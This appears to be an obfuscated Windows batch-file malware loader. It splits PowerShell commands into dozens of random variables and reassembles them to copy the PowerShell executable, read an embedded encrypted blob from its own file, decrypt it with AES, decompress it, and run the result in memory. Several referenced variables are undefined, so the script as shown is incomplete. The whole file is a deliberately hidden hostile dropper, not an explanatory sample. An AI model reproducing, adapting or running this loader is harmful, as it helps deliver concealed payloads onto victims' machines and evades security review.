@echo off
set "SCPbvlicqq=$URC"
set "XMGsPwWEkl=.Cry"
set "wDKQnxLLqw=-joi"
set "MhsoiHDZll=em.C"
set "ZIxrifGEIq=CJ, "
set "YWTKSCJmIe=New-"
set "UYAAUiNHLm=.Cop"
set "WwEnBZGHkW=tryP"
set "KNRzoMwAdK=tem."
set "iyCxCqagrB= if "
set "jPEnFAvvur=ay()"
set "oqrDBlVfGs=yTo("
set "xakwBRNUNt=  $f"
set "neLhVDKzHg=form"
set "KryKQeCNZG=orF'"
set "lOqZmotJXp=EY);"
set "nyqeeOpKTA=eMVs"
set "HCyYwlUDem=tem."
set "rLgIjOKKqM=comm"
set "NtQMPYqCRf=mory"
set "VYGsIVJdxO=[IO."
set "ZDuyTISsre=Mode"
set "VVIAoKxtMi=le  "
set "EAtHSntPVK=ptor"
set "dchNyzNdbC=oin "
set "WnYacuzYtR=Bmor"
set "pSwKXtgjyn== $y"
set "OTDoGFPgtd=S46e"
set "dCozbCmepc=ewLi"
set "ztlPyikIap= [Sy"
set "zCuiHODDso=ing("
set "ALyKkOuZdw=wgqi"
set "OVupcBPeGx=tsWi"
set "fEbgiveJKQ= '')"
set "LWbezYzQLz=ress"
set "HUykzUlljg=-joi"
set "IcfAFcycXh=L4Yi"
set "uWLxuOPLMV=qiF "
set "BgrQLTUxHm=m.IO"
set "pWMmwStiIO=Uaaa"
set "YyDJZunRIK=euVe"
set "CVeDNdwIEV=pose"
set "FarxYoNnUE=('%*'"
set "sxxYoVRdmZ=daeR"
set "dfcIYfZSZm=rans"
set "UAKYGRnTvx=pose"
set "XoeorZzxUD=nage"
set "yOpKZyIlKV=1] -"
set "RrdXBhTRcN=rtS4"
set "XJXlmplXES=iron"
set "RptlQWaTeV=URCU"
set "wDvdFhjgrI=ose("
set "WFpXAtDDhR=brea"
set "IpUobKhPLQ=raph"
set "MLgRfsKFHS=ode]"
set "QFxHZnCEDM=g = "
set "WgkYRvgwLz='txe"
set "aWMQRNuALX=ypto"
set "mOkaUzhKDD=m.IO"
set "gfnLtjdHQA=yste"
set "AcwsFzUcHh=stem"
set "AVrlxBAxDc=[Sys"
set "JNZFnGODMF=onve"
set "eZqecPcMQq=EGqe"
set "dRmSJvNJWj=..-1"
set "YtqhCYZhVW= New"
set "boPmuKmpvF=.Dis"
set "YuDGwaEvCq=e = "
set "SddzgNcYhx=ose("
set "BVjcxneJOw=)))"
set "aCujNDVIEL=ion."
set "MWbViRdrns=gth)"
set "HQGapOGTkb=oL'["
set "BgvCoinDhY=y.Ci"
set "SWoXTsOQmO=urit"
set "YRtBPZPkZh=ress"
set "ruWtmnKKiO== [S"
set "gKbnJpGjVk=lBlo"
set "gDGNWyNqlR=RmAx"
set "JKkZZywcAk=zuZI"
set "dnLRTJpAmO=PKCS"
set "HQftijebfj=-Obj"
set "CqBosELMdV=Fina"
set "mCtWgxknNm=Uaaa"
set "BEugWjyQnY=EY ="
set "mGsBUqjoOt=Stre"
set "GakeGBSneM=.Sec"
set "SbkFuPyaYR=);$y"
set "uWiRAxdjjz=L = "
%YaXqRletpk%%sikxFLIwcY%%HeKHrSERvj%%ICjnLflaMN%%PxmKsoVTDT%%NPKFGTpqZY%%HmXgCQZWLz%%AIJpijRapc%%WKnBvSSDHR%%PVaNfDAgiC%%oYhdtfguxw%%cpbWbWYwLJ%%XwpTKFHVjF%%JLRMOYDkip%%MxfkPAUdLj%%EevyERJntN%%xklSNryoid%%sOnvXAqeej%%KEkZbFpsiW%%opQuSBmnxx%%cGVIRPQZBe%%BEijdTalRh%%bfglPcXTCv%%ndHGheIBil%%PqRdvKgGrZ%%BawqwWzJSO%%RXwfQxWCcY%%kydFsLocPe%%VrBDUnHrkl%%FZJtuRTLmY%%NEEtPdWQXL%%HxTOSAvTkD%%QFrQtlPJlA%"%~dp0%~nx0.exe"
cls
%lWFzAcyZfi%%VgxiVtAOxt%
"%~nx0.exe" %cBsmxPfTRi%%NpoNKdwjmW%%VVIAoKxtMi%%ZYEDxYJlBq%%dcpovGfNdu%%XUaughTSYM%%rLgIjOKKqM%%tkHWTTFueH%%FKpsleYkwp%%fRmPZrVHeH%%WuwrbMneBm%%ByNrhGvOxf%%QAnaGCYSXB%%YXpxLknXry%%QUIkNHdVHs%%WgkYRvgwLz%%OvhZnEipFX%%sxxYoVRdmZ%%ydkEFSNqGp%%dRmSJvNJWj%%yOpKZyIlKV%%EdjMbLkCtv%%RSIqTBlFpS%%iigdAJNAEh%%jBGLLaIzQY%%lkpBsGfZRy%%mdWRMwWflr%%XJXlmplXES%%SLOqHYSELU%%EOJgVfEPYp%%dCozbCmepc%%uhuYFBoFjO%%DruqNjaRqg%%LwYpOqwppf%%LOpIzwtKAu%%RYFkLLhYMS%%CvNjrYifkp%%eZqecPcMQq%%PpqWpMQODc%%iyCxCqagrB%%noAlpRIAhW%%JvhwcmeQUF%%huBhgFxSCM%%OVupcBPeGx%%dqGHtMrgvq%%ljmMtTMtfK%%uPYvhNaRtB%%xakwBRNUNt%%nqxlAEJIWj%%OvZVdorkzF%%LzNTTlZPkB%%fSFLxdrMVC%%erVkMbaotn%%zCuiHODDso%%FTyudWQoyZ%%WFpXAtDDhR%%lKwXcCxxdI%%ANuHXlTBgP%%lLPtqUnxHo%%kawBcUwAsB%%ztlPyikIap%%AcwsFzUcHh%%paPPyArTEc%%OtjFqSAaVh%%JFwrNhDeVD%%ZuTklyDwrY%%RrdXBhTRcN%%YUhzyJDxbq%%WnYacuzYtR%%oeJWqrByQG%%oLchEemtMC%%UfuacEtdVh%%HUykzUlljg%%ifHubklQwX%%hfmQXiJIUL%%YyDJZunRIK%%SbkFuPyaYR%%sDHXZBHHmq%%kDqxhJBYvG%%XtiLegVGwi%%KJKdsvRFJx%%NFErzpKMyK%%nAFrTZuVTS%%GakeGBSneM%%SWoXTsOQmO%%wiiMUketjt%%aWMQRNuALX%%xwILRrlHyB%%kEIewyRykv%%xzeKMWjxgg%%XoeorZzxUD%%YwVIivnIus%%VWpqAXsXZV%%hNBrDWAuMw%%YuDGwaEvCq%%IBdNkbYNNu%%HCyYwlUDem%%UTVXuBsITz%%sWvInFJOhC%%XMGsPwWEkl%%gbqpwPFgtJ%%IpUobKhPLQ%%BgvCoinDhY%%ENyHtrFfmx%%ZDuyTISsre%%ogSuKZFOan%%CcZveURmUJ%%fbDoQXLXIG%%pVmdJyUdXu%%LRfYVWEZtY%%QFxHZnCEDM%%nIfuXHQWLG%%aNpAYnWFsT%%tMEJPKxEdv%%VqAlgcLLao%%gIoMYcqXIL%%rXlJsBewEn%%jlSqLJndtV%%CkFeNLxRKM%%tAVreXeQSF%%YphMeUPXbo%%PmDNjgsgWH%%dnLRTJpAmO%%FxlNXndSaS%%VAQvXhWiiX%%FXTlCLDpTv%%FpLnJsbPQW%%czgdLDwpTM%%MhsoiHDZll%%JNZFnGODMF%%fgrlUfRPAZ%%onwgIxWweb%%ObEEmoAAQe%%OTDoGFPgtd%%QNzmXwrSWP%%KryKQeCNZG%%EqZvkuKiAd%%IQcalbCsHQ%%XHEauwvSxC%%dchNyzNdbC%%LjsThToyzP%%BkgiJXMYbN%%ZRKXaFJpBL%%nyqeeOpKTA%%iWsIaTWYeB%%MPcnDUyuSB%%kZWNBdTbdU%%IcfAFcycXh%%JKkZZywcAk%%pURrqiZEgX%%ZUVjTKJBIA%%vvxLRzOXOd%%GRASENkOkx%%dTVahPPafp%%OUuaPUwgzQ%%tcQdqitcEf%%AVrlxBAxDc%%KNRzoMwAdK%%rdotdadRJZ%%vMwZPTDjCo%%tZCwfGlrOE%%LSZUOwGYhw%%yINEGYrRJv%%inXPqrBRnx%%PLdfnDNBls%%nEbfQLlXQh%%ouHtvxUkDx%%UOKKHMFIqd%%kPGriEmSYF%%fEbgiveJKQ%%IDYNyyUqxd%%gDGNWyNqlR%%lclYrqMEBm%%HVXAvHRSSJ%%JVuVyCXojK%%HNySEFsZwi%%LqOlwkFfrp%%GVxBhpIqAP%%tyvRFUxeWP%%pSwKXtgjyn%%WRWTeLpXLp%%WbzGOnUXFB%%NBjBZNzNDO%%izRmTBBBNU%%EAtHSntPVK%%yjDXAvHuTq%%mCtWgxknNm%%LtkLXnhCIM%%uJSTpZVUMy%%UgHxHcgwAv%%dfcIYfZSZm%%neLhVDKzHg%%CqBosELMdV%%gKbnJpGjVk%%acUzkPvzCe%%rHPtSMENqt%%tmPdfCcyyG%%WAExgAvbeC%%jlkYDzVIvW%%KSTBQNmRtH%%MWbViRdrns%%rDJNjhbQAG%%HucCVdHcGs%%nEHwPmkoQM%%wDvdFhjgrI%%MvqNasUyaf%%kaLUeMVnXX%%XMaNjdZZXO%%UAKYGRnTvx%%sLoLCvSAYS%%lViuLZvDEW%%sUBlkJpNnm%%zbRAElyplN%%lyaeDYsqmG%%wKpyexjdAS%%gfnLtjdHQA%%BgrQLTUxHm%%qZAGQOMtvg%%buOsHgloKt%%UKAMfpszNk%%DMvnCgEGUE%%xKmJyhrZiF%%IFMnsFzNBA%%wnFkDpYBQA%%BEugWjyQnY%%YtqhCYZhVW%%HQftijebfj%%iPiIdekGri%%hIADCcXxIE%%pRGTTKyaXN%%ewLeQikHex%%NtQMPYqCRf%%mGsBUqjoOt%%FkJEdKXvNt%%RptlQWaTeV%%uWiRAxdjjz%%YWTKSCJmIe%%bUPxoWmhKY%%pqkTYJcRdF%%GNmnuVvJso%%mOkaUzhKDD%%kVzljILaLi%%ARicxnIBds%%BDOwLBgjZz%%BrozvKoaeM%%jvXkNuFhCG%%RFHkcGhdAI%%CCbmHjDJHM%%ZIxrifGEIq%%VYGsIVJdxO%%DkzvjHuKCE%%RWzQHjiqbX%%aCujNDVIEL%%zzmTiOibhB%%LWbezYzQLz%%NtczNbQqIG%%MLgRfsKFHS%%ahjAleAqKP%%eeXeYfxMfh%%YRtBPZPkZh%%nTjSyFkBnJ%%BzFSBHNbTZ%%UYAAUiNHLm%%oqrDBlVfGs%%VVywFymAZh%%lOqZmotJXp%%SCPbvlicqq%%MIvAdYAdUv%%WmIDaAZrqn%%SlhqAtgwau%%pjjJvCtQWn%%OpPBsFUmbU%%mRLdxABeaK%%SddzgNcYhx%%hivdyCwFXU%%zTvgiyxglV%%boPmuKmpvF%%CVeDNdwIEV%%dWgfkYHXrH%%pWMmwStiIO%%qhjssDPSse%%cPBqReiJbv%%coXOpFjSgV%%KnZQEWMONH%%jPEnFAvvur%%KJhmLbjvcM%%uWLxuOPLMV%%ruWtmnKKiO%%kNyPkafMeC%%MrLammehSQ%%LJJyZpMNay%%rzmnCHyWmt%%JcGjjaIWhZ%%iDSsdAdZPU%%osMGlnfxyF%%NiUyhJdzpZ%%HQGapOGTkb%%DzgrfqqaYW%%UkyBmaItlt%%wDKQnxLLqw%%GlmwcobCsQ%%tdBtewrfOo%%fnIQEZOpeH%%FEJBpIYcyX%%YfbuatcrLR%%gFXbrtDvRd%%ALyKkOuZdw%%ypHQpZmnQl%%WwEnBZGHkW%%eCkvxnHqkm%%ZdopsQYgLr%%gqFGgdhljl%%hMOgrWfltc%%sVdEmTipUK%%aAWTPOWDpt%%fvhZemohXw%%LMMIYlnbum%%VSrykHPVqC%%ZBWaXWNezZ%%FarxYoNnUE%%BVjcxneJOw%
exit /b
